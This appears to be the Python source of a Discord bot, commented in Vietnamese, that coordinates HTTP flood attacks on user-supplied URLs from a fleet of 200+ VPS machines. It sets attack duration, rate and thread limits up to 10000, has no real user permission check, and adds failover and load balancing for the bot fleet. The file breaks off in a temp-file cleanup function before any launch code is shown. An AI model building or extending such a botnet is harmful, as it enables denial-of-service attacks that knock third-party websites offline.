import discord
from discord.ext import commands
import asyncio
import os
import logging
import socket
import psutil
import gc
import subprocess
import platform
import random
import sys
import json
import hashlib
import secrets
from datetime import datetime
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass
from pathlib import Path

# Bot Configuration - Đặt token Discord của bạn ở đây
TOKEN = os.getenv("DISCORD_TOKEN")
PREFIX = "."

# VPS information
VPS_NAME = os.getenv('VPS_NAME', socket.gethostname())
VPS_PORT = os.getenv('VPS_PORT', '8080')

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# Simple logging setup
logging.basicConfig(
    level=logging.INFO,
    format=f'%(asctime)s - %(levelname)s - [{VPS_NAME}] - %(message)s',
    handlers=[
        logging.FileHandler(f'bot_{VPS_NAME}.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

is_running = False  # tránh spam
current_process = None  # lưu process hiện tại để có thể dừng

# Data classes for better structure
@dataclass
class AttackLimits:
    """Attack limits configuration"""
    max_concurrent_attacks: int = 3
    max_attack_time: int = 10000
    max_rate: int = 10000
    max_threads: int = 10000
    cooldown_time: int = 5

@dataclass
class AttackStats:
    """Attack statistics tracking"""
    total_attacks: int = 0
    successful_attacks: int = 0
    failed_attacks: int = 0
    total_time: int = 0
    last_attack: Optional[str] = None

# Initialize attack limits
attack_limits = AttackLimits(
    max_attack_time=10000,
    max_rate=10000,
    max_threads=10000,
    cooldown_time=5
)

# Global state variables
is_running = False
current_process: Optional[asyncio.subprocess.Process] = None

# Connection management
CONNECTION_RETRY_COUNT = 0
MAX_RETRY_ATTEMPTS = 999999  # Liên tục retry cho đến khi thành công
RETRY_DELAY = 5  # Delay giữa các lần retry
LAST_CONNECTION_TIME = None
CONNECTION_HEALTHY = True
CONTINUOUS_RECONNECT = True  # Bật chế độ reconnect liên tục

# Load balancing cho 200+ VPS
VPS_LOAD_BALANCER = {}
MAX_VPS_PER_GROUP = 50  # Tối đa 50 VPS mỗi nhóm
VPS_GROUPS = {}  # Chia VPS thành các nhóm

# Giới hạn tối thiểu và tối đa (đã nới lỏng)
MIN_ATTACK_TIME = 1
MAX_ATTACK_TIME = 10000  # 10000 giây mặc định
MAX_ATTACK_TIME_LIMIT = 10000  # 10000 giây
MIN_RATE = 1
MAX_RATE = 10000  # 10000 rate mặc định
MAX_RATE_LIMIT = 10000  # 10000 rate
MIN_THREADS = 1
MAX_THREADS = 10000  # 10000 threads mặc định
MAX_THREADS_LIMIT = 10000  # 10000 threads
MIN_COOLDOWN = 1
COOLDOWN_TIME = 5  # 5 giây cooldown mặc định
MAX_COOLDOWN_LIMIT = 10000

# Thống kê
attack_stats = {
    "total_attacks": 0,
    "successful_attacks": 0,
    "failed_attacks": 0,
    "total_time": 0,
    "last_attack": None
}

# Rate limiting
user_cooldowns = {}  # {user_id: last_command_time}
message_queue = asyncio.Queue()  # Queue cho tin nhắn
is_processing_queue = False  # Trạng thái xử lý queue

# Hệ thống phản hồi thông minh
RESPONSE_VPS = None  # VPS chính phản hồi (sẽ được set động)
SILENT_MODE = False  # Mặc định tất cả VPS đều phản hồi
MANUAL_SILENT_MODE = False  # Theo dõi xem silent mode có được set thủ công không
FIRST_RESPONSE_LOCK = asyncio.Lock()  # Lock để đảm bảo chỉ 1 VPS phản hồi đầu tiên
MESSAGE_SENT_TRACKER = set()  # Theo dõi tin nhắn đã gửi để tránh lặp
RESPONSE_LOCK_TIMEOUT = 1.0  # Timeout cho lock (giây)
RESPONSE_COUNTER = 0  # Đếm số lần phản hồi để debug

# Cấu hình chọn VPS chính
VPS_SELECTION_MODE = "speed"  # "random", "speed", "fixed" - Tối ưu cho 200+ VPS
VPS_RESPONSE_TIMES = {}  # Lưu thời gian phản hồi của các VPS
VPS_LAST_RESET = None  # Thời gian reset VPS chính cuối cùng
VPS_RESET_INTERVAL = 300  # Reset VPS chính mỗi 5 phút (giây)

# Hệ thống heartbeat và failover
VPS_LAST_HEARTBEAT = {}  # Lưu thời gian heartbeat cuối cùng của các VPS
HEARTBEAT_INTERVAL = 60  # Kiểm tra heartbeat mỗi 60 giây cho 200+ VPS
VPS_TIMEOUT = 300  # VPS được coi là die sau 5 phút không có heartbeat
AUTO_FAILOVER = True  # Bật/tắt tự động failover

# Hệ thống countdown
COUNTDOWN_ENABLED = True  # Bật/tắt countdown
COUNTDOWN_INTERVAL = 30  # Gửi countdown mỗi 30 giây cho 200+ VPS
COUNTDOWN_FINAL = 60  # Gửi countdown mỗi 10 giây khi còn ít hơn 60 giây

# Hệ thống rate limit protection
RATE_LIMIT_DELAY = 1.0  # Giảm delay xuống 1s để phản hồi nhanh hơn
MESSAGE_COOLDOWN = {}  # Theo dõi cooldown của từng channel

def check_rate_limit(user_id: int) -> Tuple[bool, float]:
    """Enhanced rate limit checking for users"""
    current_time = datetime.now().timestamp()
    
    if user_id in user_cooldowns:
        time_diff = current_time - user_cooldowns[user_id]
        if time_diff < attack_limits.cooldown_time:
            remaining_time = attack_limits.cooldown_time - time_diff
            logger.debug(f"Rate limit active for user {user_id}, {remaining_time:.1f}s remaining")
            return False, remaining_time
    
    user_cooldowns[user_id] = current_time
    logger.debug(f"Rate limit check passed for user {user_id}")
    return True, 0

def validate_attack_params(method: str, host: str, time: int, rate: int, thread: int) -> List[str]:
    """Enhanced validation for attack parameters with better security checks"""
    errors = []
    
    # Validate method
    allowed_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']
    if method.upper() not in allowed_methods:
        errors.append(f"Method không hợp lệ. Chỉ cho phép: {', '.join(allowed_methods)}")
    
    # Validate time
    if not isinstance(time, int) or time < 1:
        errors.append("Thời gian phải là số nguyên dương")
    elif time > attack_limits.max_attack_time:
        errors.append(f"Thời gian tối đa: {attack_limits.max_attack_time}s")
    
    # Validate rate
    if not isinstance(rate, int) or rate < 1:
        errors.append("Rate phải là số nguyên dương")
    elif rate > attack_limits.max_rate:
        errors.append(f"Rate tối đa: {attack_limits.max_rate}")
    
    # Validate thread
    if not isinstance(thread, int) or thread < 1:
        errors.append("Threads phải là số nguyên dương")
    elif thread > attack_limits.max_threads:
        errors.append(f"Threads tối đa: {attack_limits.max_threads}")
    
    # Enhanced host validation
    if not isinstance(host, str) or not host.strip():
        errors.append("Host không được để trống")
    elif not host.startswith(('http://', 'https://')):
        errors.append("Host phải bắt đầu bằng http:// hoặc https://")
    elif len(host) > 2048:  # Prevent extremely long URLs
        errors.append("Host quá dài (tối đa 2048 ký tự)")
    else:
        # Additional security checks
        dangerous_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1']
        if any(pattern in host.lower() for pattern in dangerous_patterns):
            errors.append("Không được tấn công localhost hoặc địa chỉ nội bộ")
    
    return errors

def optimize_command(method: str, host: str, time: int, rate: int, thread: int) -> Tuple[str, str, int, int, int]:
    """Enhanced command optimization based on VPS resources and current load"""
    # Get current system load
    try:
        cpu_percent = psutil.cpu_percent(interval=0.1)
        memory_percent = psutil.virtual_memory().percent
    except Exception:
        cpu_percent = 0
        memory_percent = 0
    
    # Base optimization
    optimized_time = min(time, attack_limits.max_attack_time)
    optimized_rate = min(rate, attack_limits.max_rate)
    optimized_thread = min(thread, attack_limits.max_threads)
    
    # Dynamic optimization based on system load
    if cpu_percent > 80 or memory_percent > 85:
        # High load - reduce resources
        optimized_rate = int(optimized_rate * 0.5)
        optimized_thread = int(optimized_thread * 0.5)
        logger.warning(f"High system load detected (CPU: {cpu_percent}%, RAM: {memory_percent}%) - reducing attack parameters")
    elif cpu_percent > 60 or memory_percent > 70:
        # Medium load - moderate reduction
        optimized_rate = int(optimized_rate * 0.75)
        optimized_thread = int(optimized_thread * 0.75)
        logger.info(f"Medium system load detected (CPU: {cpu_percent}%, RAM: {memory_percent}%) - moderating attack parameters")
    
    # VPS-specific optimization
    if VPS_NAME.startswith('firebase-vip'):
        # VIP VPS can handle more
        pass  # Use full limits
    else:
        # Standard VPS - more conservative
        optimized_rate = min(optimized_rate, attack_limits.max_rate // 4)  # Giảm xuống 1/4 cho VPS thường
        optimized_thread = min(optimized_thread, attack_limits.max_threads // 4)  # Giảm xuống 1/4 cho VPS thường
    
    # Ensure minimum values
    optimized_rate = max(optimized_rate, 1)
    optimized_thread = max(optimized_thread, 1)
    
    return method, host, optimized_time, optimized_rate, optimized_thread

def update_stats(success: bool = True, duration: int = 0) -> None:
    """Update attack statistics with thread safety"""
    attack_stats["total_attacks"] += 1
    if success:
        attack_stats["successful_attacks"] += 1
    else:
        attack_stats["failed_attacks"] += 1
    
    attack_stats["total_time"] += duration

# Connection management functions
def update_connection_status(healthy: bool = True):
    """Update connection health status"""
    global CONNECTION_HEALTHY, LAST_CONNECTION_TIME
    CONNECTION_HEALTHY = healthy
    LAST_CONNECTION_TIME = datetime.now().timestamp()
    
    if healthy:
        print(f"✅ [{VPS_NAME}] Kết nối ổn định")
        logger.info("Kết nối ổn định")
    else:
        print(f"❌ [{VPS_NAME}] Kết nối không ổn định")
        logger.warning("Kết nối không ổn định")

async def check_connection_health():
    """Check if bot is still connected to Discord"""
    global CONNECTION_HEALTHY, CONNECTION_RETRY_COUNT
    
    try:
        # Check if bot is connected
        if not bot.is_ready():
            CONNECTION_HEALTHY = False
            print(f"⚠️ [{VPS_NAME}] Bot không ready - kết nối có vấn đề")
            logger.warning("Bot không ready - kết nối có vấn đề")
            return False
        
        # Check if we can access guilds
        if len(bot.guilds) == 0:
            CONNECTION_HEALTHY = False
            print(f"⚠️ [{VPS_NAME}] Không có guild nào - kết nối có vấn đề")
            logger.warning("Không có guild nào - kết nối có vấn đề")
            return False
        
        # Connection is healthy
        update_connection_status(True)
        CONNECTION_RETRY_COUNT = 0  # Reset retry count on successful connection
        return True
        
    except Exception as e:
        CONNECTION_HEALTHY = False
        print(f"❌ [{VPS_NAME}] Lỗi kiểm tra kết nối: {e}")
        logger.error(f"Lỗi kiểm tra kết nối: {e}")
        return False

async def reconnect_bot():
    """Attempt to reconnect the bot - Liên tục retry cho đến khi thành công"""
    global CONNECTION_RETRY_COUNT, CONNECTION_HEALTHY, CONTINUOUS_RECONNECT
    
    if not CONTINUOUS_RECONNECT and CONNECTION_RETRY_COUNT >= MAX_RETRY_ATTEMPTS:
        print(f"❌ [{VPS_NAME}] Đã thử kết nối lại {MAX_RETRY_ATTEMPTS} lần - dừng thử")
        logger.error(f"Đã thử kết nối lại {MAX_RETRY_ATTEMPTS} lần - dừng thử")
        return False
    
    CONNECTION_RETRY_COUNT += 1
    print(f"🔄 [{VPS_NAME}] Thử kết nối lại lần {CONNECTION_RETRY_COUNT} {'(liên tục)' if CONTINUOUS_RECONNECT else f'/{MAX_RETRY_ATTEMPTS}'}")
    logger.info(f"Thử kết nối lại lần {CONNECTION_RETRY_COUNT} {'(liên tục)' if CONTINUOUS_RECONNECT else f'/{MAX_RETRY_ATTEMPTS}'}")
    
    try:
        # Close current connection if exists
        if not bot.is_closed():
            print(f"🔄 [{VPS_NAME}] Đang đóng kết nối cũ...")
            await bot.close()
        
        # Wait before reconnecting
        print(f"⏰ [{VPS_NAME}] Chờ {RETRY_DELAY}s trước khi kết nối lại...")
        await asyncio.sleep(RETRY_DELAY)
        
        # Start bot again
        print(f"🚀 [{VPS_NAME}] Đang khởi động bot...")
        await bot.start(TOKEN)
        
        # Reset retry count on successful connection
        CONNECTION_RETRY_COUNT = 0
        CONNECTION_HEALTHY = True
        print(f"✅ [{VPS_NAME}] Kết nối lại thành công!")
        logger.info("Kết nối lại thành công!")
        return True
        
    except Exception as e:
        print(f"❌ [{VPS_NAME}] Lỗi kết nối lại: {e}")
        logger.error(f"Lỗi kết nối lại: {e}")
        CONNECTION_HEALTHY = False
        return False

async def continuous_reconnect_loop():
    """Vòng lặp reconnect liên tục cho đến khi thành công"""
    global CONNECTION_HEALTHY, CONNECTION_RETRY_COUNT, CONTINUOUS_RECONNECT
    
    print(f"🔄 [{VPS_NAME}] Khởi động vòng lặp reconnect liên tục...")
    logger.info("Khởi động vòng lặp reconnect liên tục...")
    
    while CONTINUOUS_RECONNECT:
        try:
            # Check if connection is healthy
            is_healthy = await check_connection_health()
            
            if not is_healthy:
                print(f"🔄 [{VPS_NAME}] Kết nối không ổn định - thử kết nối lại...")
                logger.warning("Kết nối không ổn định - thử kết nối lại...")
                
                # Try to reconnect
                success = await reconnect_bot()
                if success:
                    print(f"✅ [{VPS_NAME}] Kết nối lại thành công!")
                    logger.info("Kết nối lại thành công!")
                    CONNECTION_RETRY_COUNT = 0  # Reset counter on success
                else:
                    print(f"❌ [{VPS_NAME}] Kết nối lại thất bại - thử lại sau {RETRY_DELAY}s")
                    logger.error("Kết nối lại thất bại - thử lại sau {RETRY_DELAY}s")
                    await asyncio.sleep(RETRY_DELAY)
            else:
                # Connection is healthy, wait before next check
                await asyncio.sleep(30)
                
        except Exception as e:
            print(f"❌ [{VPS_NAME}] Lỗi trong vòng lặp reconnect: {e}")
            logger.error(f"Lỗi trong vòng lặp reconnect: {e}")
            await asyncio.sleep(10)
    
    print(f"🛑 [{VPS_NAME}] Dừng vòng lặp reconnect liên tục")
    logger.info("Dừng vòng lặp reconnect liên tục")

# Load balancing functions for 200+ VPS
def assign_vps_to_group(vps_name: str) -> int:
    """Assign VPS to a group for load balancing"""
    global VPS_GROUPS
    
    # Find group with least VPS
    min_group = 0
    min_count = float('inf')
    
    for group_id, vps_list in VPS_GROUPS.items():
        if len(vps_list) < min_count:
            min_count = len(vps_list)
            min_group = group_id
    
    # If group is full, create new group
    if min_count >= MAX_VPS_PER_GROUP:
        min_group = len(VPS_GROUPS)
        VPS_GROUPS[min_group] = []
    
    # Add VPS to group
    if min_group not in VPS_GROUPS:
        VPS_GROUPS[min_group] = []
    VPS_GROUPS[min_group].append(vps_name)
    
    return min_group

def get_vps_group(vps_name: str) -> int:
    """Get VPS group number"""
    for group_id, vps_list in VPS_GROUPS.items():
        if vps_name in vps_list:
            return group_id
    return assign_vps_to_group(vps_name)

def should_respond_in_group(vps_name: str) -> bool:
    """Check if VPS should respond in its group"""
    group_id = get_vps_group(vps_name)
    group_vps = VPS_GROUPS.get(group_id, [])
    
    if not group_vps:
        return True
    
    # Find fastest VPS in group
    fastest_vps = None
    fastest_time = float('inf')
    
    for vps in group_vps:
        if vps in VPS_RESPONSE_TIMES:
            response_time = VPS_RESPONSE_TIMES[vps]
            if response_time < fastest_time:
                fastest_time = response_time
                fastest_vps = vps
    
    return vps_name == fastest_vps

def check_user_permissions(user_id: int) -> bool:
    """Check if user has permission to use the bot"""
    # This is a basic implementation - you can extend this with database lookups
    # For now, allow all users, but you can add whitelist/blacklist logic here
    return True

def sanitize_input(text: str, max_length: int = 10000) -> str:
    """Sanitize user input to prevent injection attacks"""
    if not isinstance(text, str):
        return ""
    
    # Remove potentially dangerous characters
    dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '<', '>', '"', "'"]
    for char in dangerous_chars:
        text = text.replace(char, '')
    
    # Limit length
    text = text[:max_length]
    
    # Remove extra whitespace
    text = ' '.join(text.split())
    
    return text

def validate_limit_value(value: Any, min_val: int, max_val: int, value_name: str) -> Tuple[bool, int, Optional[str]]:
    """Enhanced validation for limit values with better error handling"""
    try:
        if isinstance(value, str):
            value = value.strip()
            if not value:
                return False, 0, f"{value_name} không được để trống"
        
        val = int(value)
        
        if not isinstance(val, int):
            return False, 0, f"{value_name} phải là số nguyên"
        
        if val < min_val:
            return False, val, f"{value_name} phải lớn hơn hoặc bằng {min_val}"
        
        if val > max_val:
            return False, val, f"{value_name} phải nhỏ hơn hoặc bằng {max_val}"
        
        return True, val, None
        
    except (ValueError, TypeError) as e:
        logger.warning(f"Invalid limit value '{value}' for {value_name}: {e}")
        return False, 0, f"{value_name} phải là số nguyên hợp lệ"
    except Exception as e:
        logger.error(f"Unexpected error validating limit value '{value}' for {value_name}: {e}")
        return False, 0, f"Lỗi không mong muốn khi xác thực {value_name}"

def set_attack_time_limit(value: Any) -> Tuple[bool, str]:
    """Set attack time limit with enhanced validation"""
    is_valid, val, error = validate_limit_value(value, MIN_ATTACK_TIME, MAX_ATTACK_TIME_LIMIT, "Thời gian tấn công")
    if is_valid:
        attack_limits.max_attack_time = val
        logger.info(f"Attack time limit updated to {val}s")
        return True, f"Đã set thời gian tấn công tối đa: {val}s"
    else:
        logger.warning(f"Failed to set attack time limit: {error}")
        return False, error

def set_rate_limit(value: Any) -> Tuple[bool, str]:
    """Set rate limit with enhanced validation"""
    is_valid, val, error = validate_limit_value(value, MIN_RATE, MAX_RATE_LIMIT, "Rate")
    if is_valid:
        attack_limits.max_rate = val
        logger.info(f"Rate limit updated to {val}")
        return True, f"Đã set rate tối đa: {val}"
    else:
        logger.warning(f"Failed to set rate limit: {error}")
        return False, error

def set_thread_limit(value: Any) -> Tuple[bool, str]:
    """Set thread limit with enhanced validation"""
    is_valid, val, error = validate_limit_value(value, MIN_THREADS, MAX_THREADS_LIMIT, "Threads")
    if is_valid:
        attack_limits.max_threads = val
        logger.info(f"Thread limit updated to {val}")
        return True, f"Đã set threads tối đa: {val}"
    else:
        logger.warning(f"Failed to set thread limit: {error}")
        return False, error

def set_cooldown_limit(value: Any) -> Tuple[bool, str]:
    """Set cooldown limit with enhanced validation"""
    is_valid, val, error = validate_limit_value(value, MIN_COOLDOWN, MAX_COOLDOWN_LIMIT, "Cooldown")
    if is_valid:
        attack_limits.cooldown_time = val
        logger.info(f"Cooldown limit updated to {val}s")
        return True, f"Đã set cooldown: {val}s"
    else:
        logger.warning(f"Failed to set cooldown limit: {error}")
        return False, error

def get_current_limits() -> Dict[str, int]:
    """Get current attack limits"""
    return {
        "max_attack_time": attack_limits.max_attack_time,
        "max_rate": attack_limits.max_rate,
        "max_threads": attack_limits.max_threads,
        "cooldown_time": attack_limits.cooldown_time,
        "max_concurrent": attack_limits.max_concurrent_attacks
    }

def should_reset_vps():
    """Kiểm tra xem có nên reset VPS chính không"""
    global VPS_LAST_RESET
    if VPS_LAST_RESET is None:
        return True
    
    current_time = datetime.now().timestamp()
    return (current_time - VPS_LAST_RESET) > VPS_RESET_INTERVAL

def select_main_vps():
    """Chọn VPS chính dựa trên mode"""
    global VPS_SELECTION_MODE, VPS_RESPONSE_TIMES, RESPONSE_VPS
    
    if VPS_SELECTION_MODE == "random":
        # Chọn ngẫu nhiên từ danh sách VPS đã biết
        known_vps = list(VPS_RESPONSE_TIMES.keys()) + [VPS_NAME]
        if not known_vps:
            return VPS_NAME
        return random.choice(known_vps)
    
    elif VPS_SELECTION_MODE == "speed":
        # Chọn VPS có thời gian phản hồi nhanh nhất
        if not VPS_RESPONSE_TIMES:
            return VPS_NAME
        
        fastest_vps = min(VPS_RESPONSE_TIMES.items(), key=lambda x: x[1])
        return fastest_vps[0]
    
    else:  # "fixed" - giữ nguyên VPS hiện tại
        return RESPONSE_VPS or VPS_NAME

def record_response_time(vps_name, response_time):
    """Ghi lại thời gian phản hồi của VPS"""
    global VPS_RESPONSE_TIMES
    VPS_RESPONSE_TIMES[vps_name] = response_time

def update_heartbeat(vps_name):
    """Cập nhật heartbeat cho VPS"""
    global VPS_LAST_HEARTBEAT
    VPS_LAST_HEARTBEAT[vps_name] = datetime.now().timestamp()

def is_vps_alive(vps_name):
    """Kiểm tra xem VPS có còn sống không"""
    global VPS_LAST_HEARTBEAT, VPS_TIMEOUT
    if vps_name not in VPS_LAST_HEARTBEAT:
        return False
    
    current_time = datetime.now().timestamp()
    last_heartbeat = VPS_LAST_HEARTBEAT[vps_name]
    return (current_time - last_heartbeat) < VPS_TIMEOUT

def get_alive_vps_list():
    """Lấy danh sách VPS còn sống"""
    alive_vps = []
    for vps_name in VPS_LAST_HEARTBEAT.keys():
        if is_vps_alive(vps_name):
            alive_vps.append(vps_name)
    return alive_vps

def select_backup_vps():
    """Chọn VPS backup khi VPS chính die"""
    global VPS_SELECTION_MODE, VPS_RESPONSE_TIMES
    
    alive_vps = get_alive_vps_list()
    if not alive_vps:
        return VPS_NAME  # Fallback về VPS hiện tại
    
    if VPS_SELECTION_MODE == "random":
        return random.choice(alive_vps)
    elif VPS_SELECTION_MODE == "speed":
        # Chọn VPS nhanh nhất trong danh sách còn sống
        alive_times = {vps: time for vps, time in VPS_RESPONSE_TIMES.items() if vps in alive_vps}
        if not alive_times:
            return alive_vps[0]
        fastest_vps = min(alive_times.items(), key=lambda x: x[1])
        return fastest_vps[0]
    else:  # "fixed"
        return alive_vps[0] if alive_vps else VPS_NAME

async def should_respond():
    """Kiểm tra xem VPS này có nên phản hồi không - Tối ưu cho 200+ VPS"""
    try:
        global RESPONSE_VPS, SILENT_MODE, VPS_LAST_RESET, AUTO_FAILOVER
        
        # Cập nhật heartbeat cho VPS này
        update_heartbeat(VPS_NAME)
        
        # Assign VPS to group for load balancing
        group_id = get_vps_group(VPS_NAME)
        
        # Kiểm tra xem có nên reset VPS chính không
        if should_reset_vps():
            RESPONSE_VPS = None
            VPS_LAST_RESET = datetime.now().timestamp()
            print(f"🔄 [{VPS_NAME}] Reset VPS chính - chọn lại VPS phản hồi (Group {group_id})")
            logger.info(f"Reset VPS chính - chọn lại VPS phản hồi (Group {group_id})")
        
        # Kiểm tra VPS chính có còn sống không (nếu bật auto failover)
        if AUTO_FAILOVER and RESPONSE_VPS is not None and not is_vps_alive(RESPONSE_VPS):
            print(f"💀 [{VPS_NAME}] VPS chính {RESPONSE_VPS} đã die - chọn VPS backup (Group {group_id})")
            logger.info(f"VPS chính {RESPONSE_VPS} đã die - chọn VPS backup (Group {group_id})")
            RESPONSE_VPS = None
        
        # Nếu đã có VPS chính, kiểm tra xem có phải VPS này không
        if RESPONSE_VPS is not None:
            is_main = VPS_NAME == RESPONSE_VPS
            # Chỉ ghi đè SILENT_MODE nếu chưa được set thủ công bởi người dùng
            if not MANUAL_SILENT_MODE:
                if not is_main:
                    SILENT_MODE = True
                    print(f"🔇 [{VPS_NAME}] Không phải VPS chính ({RESPONSE_VPS}) - im lặng")
                else:
                    SILENT_MODE = False
                    print(f"🎯 [{VPS_NAME}] Là VPS chính - sẽ phản hồi")
            else:
                print(f"🔇 [{VPS_NAME}] Silent mode được set thủ công - không ghi đè")
                # Nếu MANUAL_SILENT_MODE = True và SILENT_MODE = False, VPS này sẽ phản hồi
                if not SILENT_MODE:
                    print(f"🎯 [{VPS_NAME}] Manual silent mode OFF - sẽ phản hồi")
                    return True
            return is_main
        
        # Nếu chưa có VPS chính, VPS này sẽ trở thành VPS chính (first come, first served)
        try:
            async def acquire_lock():
                global RESPONSE_VPS
                async with FIRST_RESPONSE_LOCK:
                    if RESPONSE_VPS is None:
                        # VPS này trở thành VPS chính
                        RESPONSE_VPS = VPS_NAME
                        if not MANUAL_SILENT_MODE:
                            SILENT_MODE = False
                        
                        # Ghi lại thời gian phản hồi của VPS này
                        response_time = datetime.now().timestamp()
                        record_response_time(VPS_NAME, response_time)
                        
                        print(f"🎯 [{VPS_NAME}] Trở thành VPS chính phản hồi! (First come, first served)")
                        logger.info(f"Trở thành VPS chính phản hồi! (First come, first served)")
                        
                        return True
                    else:
                        # VPS khác đã trở thành chính, VPS này sẽ im lặng
                        if not MANUAL_SILENT_MODE:
                            SILENT_MODE = True
                        print(f"🔇 [{VPS_NAME}] VPS chính: {RESPONSE_VPS} - Chuyển sang silent mode")
                        logger.info(f"VPS chính: {RESPONSE_VPS} - Chuyển sang silent mode")
                        return False
            
            return await asyncio.wait_for(acquire_lock(), timeout=RESPONSE_LOCK_TIMEOUT)
        except asyncio.TimeoutError:
            # Nếu timeout, VPS này sẽ im lặng để tránh spam
            if not MANUAL_SILENT_MODE:
                SILENT_MODE = True
            print(f"⏰ [{VPS_NAME}] Timeout khi chọn VPS chính - Chuyển sang silent mode")
            logger.info(f"Timeout khi chọn VPS chính - Chuyển sang silent mode")
            return False
    except Exception as e:
        print(f"❌ [{VPS_NAME}] Lỗi trong should_respond: {e}")
        logger.error(f"Lỗi trong should_respond: {e}")
        # Fallback: VPS này sẽ phản hồi để tránh bot bị "chết"
        SILENT_MODE = False
        return True

def silent_log(message):
    """Log im lặng cho VPS không phản hồi"""
    print(f"🔇 [{VPS_NAME}] {message}")
    logger.info(f"[SILENT] {message}")

async def safe_send_message(ctx, embed, delay=0.1):
    """Gửi tin nhắn an toàn với delay để tránh rate limit"""
    global MESSAGE_COOLDOWN, RATE_LIMIT_DELAY, SILENT_MODE, RESPONSE_VPS
    try:
        # Debug logging
        print(f"🔍 [{VPS_NAME}] Debug - SILENT_MODE: {SILENT_MODE}, MANUAL_SILENT_MODE: {MANUAL_SILENT_MODE}, RESPONSE_VPS: {RESPONSE_VPS}")
        
        # Kiểm tra silent mode
        if SILENT_MODE:
            print(f"🔇 [{VPS_NAME}] Silent mode: {embed.title or embed.description}")
            logger.info(f"Silent mode: {embed.title or embed.description}")
            return True
        
        # Kiểm tra xem VPS này có phải VPS chính không (chỉ khi không có manual silent mode)
        if not MANUAL_SILENT_MODE and RESPONSE_VPS is not None and RESPONSE_VPS != VPS_NAME:
            silent_log(f"Không phải VPS chính ({RESPONSE_VPS}), bỏ qua: {embed.title or embed.description}")
            return True
        
        # Tạo unique key cho tin nhắn để tránh lặp
        message_key = f"{ctx.channel.id}_{ctx.author.id}_{embed.title or embed.description}"
        if message_key in MESSAGE_SENT_TRACKER:
            silent_log(f"Tin nhắn đã gửi, bỏ qua: {message_key}")
            return True
        
        # Kiểm tra cooldown của channel
        current_time = datetime.now().timestamp()
        channel_id = ctx.channel.id
        
        if channel_id in MESSAGE_COOLDOWN:
            time_since_last = current_time - MESSAGE_COOLDOWN[channel_id]
            if time_since_last < RATE_LIMIT_DELAY:
                wait_time = RATE_LIMIT_DELAY - time_since_last
                print(f"⏰ [{VPS_NAME}] Channel cooldown - chờ {wait_time:.1f}s")
                await asyncio.sleep(wait_time)
        
        # Delay để tránh rate limit
        await asyncio.sleep(delay)
        
        # Cập nhật cooldown của channel
        MESSAGE_COOLDOWN[channel_id] = datetime.now().timestamp()
        
        # Retry mechanism cho lỗi 429
        max_retries = 3
        for attempt in range(max_retries):
            try:
                await ctx.send(embed=embed)
                MESSAGE_SENT_TRACKER.add(message_key)
                
                # Tăng counter và log
                global RESPONSE_COUNTER
                RESPONSE_COUNTER += 1
                print(f"✅ [{VPS_NAME}] Đã gửi tin nhắn #{RESPONSE_COUNTER}: {embed.title or embed.description}")
                
                # Giới hạn kích thước tracker để tránh memory leak
                if len(MESSAGE_SENT_TRACKER) > 1000:
                    # Xóa 50% tin nhắn cũ nhất
                    items_to_remove = list(MESSAGE_SENT_TRACKER)[:500]
                    for item in items_to_remove:
                        MESSAGE_SENT_TRACKER.discard(item)
                
                return True
                
            except discord.HTTPException as e:
                if e.status == 429:  # Rate limit
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 2.0
                    print(f"⏰ [{VPS_NAME}] Rate limit 429 - chờ {retry_after}s (attempt {attempt + 1}/{max_retries})")
                    logger.warning(f"Rate limit 429 - chờ {retry_after}s (attempt {attempt + 1}/{max_retries})")
                    
                    if attempt < max_retries - 1:
                        await asyncio.sleep(retry_after)
                        continue
                    else:
                        print(f"❌ [{VPS_NAME}] Rate limit sau {max_retries} lần thử")
                        logger.error(f"Rate limit sau {max_retries} lần thử")
                        return False
                else:
                    raise e
            except Exception as e:
                if attempt < max_retries - 1:
                    print(f"⚠️ [{VPS_NAME}] Lỗi gửi tin nhắn (attempt {attempt + 1}/{max_retries}): {e}")
                    await asyncio.sleep(1.0)
                    continue
                else:
                    raise e
        
        return False
        
    except Exception as e:
        print(f"❌ [{VPS_NAME}] Lỗi trong safe_send_message: {e}")
        logger.error(f"Lỗi trong safe_send_message: {e}")
        return False

async def process_message_queue():
    """Xử lý queue tin nhắn với delay"""
    global is_processing_queue
    is_processing_queue = True
    
    while True:
        try:
            if message_queue.empty():
                await asyncio.sleep(0.01)  # Giảm delay từ 0.1s xuống 0.01s
                continue
                
            ctx, embed, delay = await message_queue.get()
            
            # Kiểm tra xem VPS này có nên phản hồi không
            is_main_vps = await should_respond()
            if not is_main_vps:
                silent_log(f"Bỏ qua tin nhắn trong queue: {embed.title or embed.description}")
                message_queue.task_done()
                continue
                
            await safe_send_message(ctx, embed, delay)
            message_queue.task_done()
            
        except Exception as e:
            logger.error(f"Lỗi khi xử lý queue: {e}")
            await asyncio.sleep(1)

def get_system_info():
    """Lấy thông tin hệ thống"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            "cpu_percent": cpu_percent,
            "memory_percent": memory.percent,
            "memory_used": memory.used // (1024**3),  # GB
            "memory_total": memory.total // (1024**3),  # GB
            "disk_percent": disk.percent,
            "disk_used": disk.used // (1024**3),  # GB
            "disk_total": disk.total // (1024**3),  # GB
            "boot_time": psutil.boot_time()
        }
    except Exception as e:
        logger.error(f"Lỗi khi lấy thông tin hệ thống: {e}")
        return None

def perform_memory_cleanup():
    """Dọn dẹp bộ nhớ"""
    try:
        # Garbage collection
        collected = gc.collect()
        
        # Clear Python cache
        if hasattr(os, 'system'):
            if platform.system() == "Windows":
                os.system("echo off")
            else:
                os.system("sync && echo 3 > /proc/sys/vm/drop_caches")
        
        return collected
    except Exception as e:
        logger.error(f"Lỗi khi dọn dẹp bộ nhớ: {e}")
        return 0

def perform_temp_cleanup():
    """Dọn dẹp file tạm"""
    try:
        temp_dirs = []
        if platform.system() == "Windows":
            temp_dirs = [os.environ.get('TEMP', ''), os.environ.get('TMP', '')]
        else:
            temp_dirs = ['/tmp', '/var/tmp']
        
        cleaned_files = 0
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for root, dirs, files in os.walk(temp_dir):
